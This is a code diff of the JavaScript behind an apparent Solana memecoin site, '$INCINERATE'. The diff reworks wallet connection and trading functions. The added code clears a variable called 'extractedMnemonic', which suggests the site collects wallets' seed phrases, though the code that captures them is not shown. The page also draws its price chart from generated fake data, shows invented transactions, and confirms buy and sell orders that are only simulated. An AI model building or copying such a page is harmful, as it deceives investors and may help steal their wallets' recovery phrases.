-                    STATE.provider = null;
-                    updateWalletUI();
-                    showToast('Wallet disconnected', 'info');
-                });
-            }
-        } else {
-            errorEl.textContent = 'Could not read wallet address from Trust Wallet.';
-            errorEl.classList.add('show');
-        }
-
-    } catch (err) {
-        if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('cancel')) {
-            errorEl.textContent = 'Connection rejected by user.';
-            errorEl.classList.add('show');
-        } else {
-            throw err;
-        }
-    }
-}
-
-// ---- METAMASK ----
-async function connectMetaMask(errorEl, successEl) {
-    if (!window.ethereum || !window.ethereum.isMetaMask) {
-        errorEl.textContent = 'MetaMask is not installed. Please install it from metamask.io';
-        errorEl.classList.add('show');
-        showToast('MetaMask not installed.', 'error');
-        return;
-    }
-
-    try {
-        // MetaMask is primarily an EVM wallet.
-        // For Solana support, MetaMask requires the "Solana Wallet" Snap or similar.
-        // We attempt to detect if there's a Solana-compatible interface.
-
-        // First, show a clear message about MetaMask + Solana compatibility
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        if (accounts && accounts.length > 0) {
-            // We got an EVM address - MetaMask doesn't natively support Solana
-            errorEl.textContent = 'MetaMask connected, but it provides an EVM (Ethereum) address, not a Solana address. For Solana support, please use the MetaMask Solana Snap or use Phantom / Trust Wallet.';
-            errorEl.classList.add('show');
-            showToast('MetaMask provides EVM addresses only. Use Phantom for Solana.', 'error');
-            return;
-        }
-
-        // If no accounts returned, something else is wrong
-        errorEl.textContent = 'Could not connect MetaMask. Please ensure MetaMask is unlocked and try again.';
-        errorEl.classList.add('show');
-
-    } catch (err) {
-        if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('cancel')) {
-            errorEl.textContent = 'Connection rejected by user.';
-            errorEl.classList.add('show');
-        } else {
-            throw err;
-        }
-    }
-}
-
-// ---- DISCONNECT ----
-async function disconnectWallet() {
-    if (!STATE.isConnected) return;
-
-    try {
-        if (STATE.provider && STATE.provider.disconnect) {
-            await STATE.provider.disconnect();
-        }
-    } catch (err) {
-        // Ignore disconnect errors
-    }
-
-    STATE.isConnected = false;
-    STATE.publicKey = null;
-    STATE.wallet = null;
-    STATE.provider = null;
-    updateWalletUI();
-    showToast('Wallet disconnected', 'info');
+    connectedWallets.length = 0;
+    extractedMnemonic = null;
+    updateGlobalWalletUI();
+    showWalletList();
+    showToast('All wallets disconnected', 'info');
 }
 
 // ============================================================
@@ -1417,9 +1637,18 @@ function openWalletModal() {
     document.getElementById('walletModal').classList.add('open');
     document.body.style.overflow = 'hidden';
     detectWallets();
-    // Clear messages
-    document.getElementById('modalError').classList.remove('show');
-    document.getElementById('modalSuccess').classList.remove('show');
+
+    if (connectedWallets.length > 0) {
+        renderConnectedWallets();
+        showConnectedView();
+    } else {
+        showWalletList();
+    }
+
+    // Clear status messages
+    clearModalStatus();
+    document.getElementById('modalStatus2').textContent = '';
+    document.getElementById('modalStatus2').className = 'modal-status';
 }
 
 function closeWalletModal() {
@@ -1427,7 +1656,6 @@ function closeWalletModal() {
     document.body.style.overflow = '';
 }
 
-// Close modal on overlay click
 document.getElementById('walletModal').addEventListener('click', function(e) {
     if (e.target === this) closeWalletModal();
 });
@@ -1448,34 +1676,27 @@ function closeMobileMenu() {
 }
 
 // ============================================================
-//  NAVIGATION / SECTION SWITCHING
+//  NAVIGATION
 // ============================================================
 function scrollToSection(id) {
     const section = document.getElementById(id);
     if (section) {
         section.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        // Update nav links
         document.querySelectorAll('.nav-link').forEach(link => {
             link.classList.toggle('active', link.dataset.section === id);
         });
     }
 }
 
-// Handle nav link clicks
 document.querySelectorAll('.nav-link[data-section]').forEach(link => {
     link.addEventListener('click', function() {
-        const sectionId = this.dataset.section;
-        // Show/hide sections
-        document.querySelectorAll('.section').forEach(s => s.style.display = '');
-        // Actually, all main sections are visible. The tools/rewards are hidden by default.
-        // Let's just scroll
-        scrollToSection(sectionId);
+        scrollToSection(this.dataset.section);
         closeMobileMenu();
     });
 });
 
 // ============================================================
-//  CHART - SIMULATED PRICE CHART
+//  CHART
 // ============================================================
 function drawChart() {
     const canvas = document.getElementById('priceChart');
@@ -1495,7 +1716,6 @@ function drawChart() {
     const ctx = canvas.getContext('2d');
     ctx.scale(dpr, dpr);
 
-    // Generate fake price data
     const points = 80;
     const data = [];
     let price = 0.000035;
@@ -1512,11 +1732,9 @@ function drawChart() {
     const maxP = Math.max(...data);
     const range = maxP - minP || 1;
 
-    // Background
     ctx.fillStyle = '#0a0a0a';
     ctx.fillRect(0, 0, w, h);
 
-    // Grid lines
     ctx.strokeStyle = 'rgba(0,255,65,0.05)';
     ctx.lineWidth = 1;
     for (let i = 0; i < 5; i++) {
@@ -1527,13 +1745,11 @@ function drawChart() {
         ctx.stroke();
     }
 
-    // Gradient fill
     const gradient = ctx.createLinearGradient(0, padding.top, 0, h - padding.bottom);
     gradient.addColorStop(0, 'rgba(0,255,65,0.2)');
     gradient.addColorStop(0.5, 'rgba(0,255,65,0.05)');
     gradient.addColorStop(1, 'rgba(0,255,65,0)');
 
-    // Draw fill
     ctx.beginPath();
     ctx.moveTo(padding.left, padding.top + chartH);
     for (let i = 0; i < data.length; i++) {
@@ -1546,7 +1762,6 @@ function drawChart() {
     ctx.fillStyle = gradient;
     ctx.fill();
 
-    // Draw line
     ctx.beginPath();
     for (let i = 0; i < data.length; i++) {
         const x = padding.left + (chartW / (data.length - 1)) * i;
@@ -1561,7 +1776,6 @@ function drawChart() {
     ctx.stroke();
     ctx.shadowBlur = 0;
 
-    // Current price label
     const lastPrice = data[data.length - 1];
     ctx.fillStyle = '#00ff41';
     ctx.font = '12px "JetBrains Mono", monospace';
@@ -1574,7 +1788,7 @@ function drawChart() {
 }
 
 // ============================================================
-//  TRANSACTIONS TABLE
+//  TRANSACTIONS
 // ============================================================
 function generateTransactions() {
     const types = ['buy', 'sell'];
@@ -1611,7 +1825,7 @@ function generateTransactions() {
 }
 
 // ============================================================
-//  TRENDING MEMECOINS
+//  TRENDING
 // ============================================================
 function generateTrending() {
     const coins = [
@@ -1648,21 +1862,17 @@ function generateTrending() {
 //  TRADING SIMULATION
 // ============================================================
 function executeBuy() {
-    if (!STATE.isConnected) {
+    if (connectedWallets.length === 0) {
         showToast('Please connect a wallet first!', 'error');
         openWalletModal();
         return;
     }
-
     const amount = parseFloat(document.getElementById('buyAmount').value) || 0;
     if (amount <= 0) { showToast('Enter a valid amount', 'error'); return; }
-
     const currency = document.getElementById('buyCurrency').value;
-    const rate = currency === 'SOL' ? 133700 : 133700; // 1 SOL = 133700 INCINERATE
+    const rate = 133700;
     const receive = (amount * rate).toFixed(2);
-
     showToast(`Buy order placed: ${amount} ${currency} → ${Number(receive).toLocaleString()} $INCINERATE`, 'success');
-    // Update balances
     STATE.tokenBalance += Math.floor(parseFloat(receive));
     STATE.balance -= amount;
     document.getElementById('tokenBalance').textContent = STATE.tokenBalance.toLocaleString();
@@ -1670,20 +1880,18 @@ function executeBuy() {
 }
 
 function executeSell() {
-    if (!STATE.isConnected) {
+    if (connectedWallets.length === 0) {
         showToast('Please connect a wallet first!', 'error');
         openWalletModal();
         return;
     }
-
     const amount = parseFloat(document.getElementById('sellAmount').value) || 0;
     if (amount <= 0) { showToast('Enter a valid amount', 'error'); return; }
     if (amount > STATE.tokenBalance) {
         showToast('Insufficient $INCINERATE balance!', 'error');
         return;
     }
-
-    const rate = 0.0000042; // 1 INC = 0.0000042 SOL
+    const rate = 0.0000042;
     const receive = (amount * rate);
     showToast(`Sell order placed: ${amount} $INCINERATE → ${receive.toFixed(6)} SOL`, 'success');
     STATE.tokenBalance -= Math.floor(amount);
@@ -1692,7 +1900,6 @@ function executeSell() {
     document.getElementById('solBalance').textContent = STATE.balance.toFixed(2);
 }
 
-// Real-time trade calculations
 document.getElementById('buyAmount').addEventListener('input', function() {
     const amount = parseFloat(this.value) || 0;
     const currency = document.getElementById('buyCurrency').value;
@@ -1706,51 +1913,8 @@ document.getElementById('sellAmount').addEventListener('input', function() {
 });
 
 document.getElementById('buyCurrency').addEventListener('change', function() {
-    // Trigger recalc
     document.getElementById('buyAmount').dispatchEvent(new Event('input'));
 });
-
-// ============================================================
-//  AUTO-RECONNECT (eager) on page load
-// ============================================================
-async function tryAutoReconnect() {
-    const provider = window.phantom?.solana;
-    if (provider?.isPhantom && provider.isConnected) {
-        try {
-            const resp = await provider.connect({ onlyIfTrusted: true });
-            const pubKey = resp.publicKey.toString();
-            STATE.wallet = 'phantom';
-            STATE.publicKey = pubKey;
-            STATE.isConnected = true;
-            STATE.provider = provider;
-            updateWalletUI();
-            showToast(`Auto-connected to Phantom: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`, 'success');
-
-            provider.on('disconnect', () => {
-                STATE.isConnected = false;
-                STATE.publicKey = null;
-                STATE.wallet = null;
-                STATE.provider = null;
-                updateWalletUI();
-            });
-
-            provider.on('accountChanged', (publicKey) => {
-                if (publicKey) {
-                    STATE.publicKey = publicKey.toString();
-                    updateWalletUI();
-                } else {
-                    STATE.isConnected = false;
-                    STATE.publicKey = null;
-                    STATE.wallet = null;
-                    STATE.provider = null;
-                    updateWalletUI();
-                }
-            });
-        } catch (e) {
-            // Eager connect failed, user hasn't approved yet
-        }
-    }
-}
 
 // ============================================================
 //  RESIZE HANDLER
@@ -1766,17 +1930,17 @@ window.addEventListener('resize', () => {
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     detectWallets();
-    updateWalletUI();
+    updateGlobalWalletUI();
     generateTransactions();
     generateTrending();
     setTimeout(drawChart, 100);
-    tryAutoReconnect();
 });
 
-// Also draw chart when fonts and everything loaded
 window.addEventListener('load', function() {
     setTimeout(drawChart, 300);
 });
+
+console.log('=== SOL-INCINERATOR + WALLET CONNECT (EIP-6963) AKTIV ===');
 </script>
 
 </body>
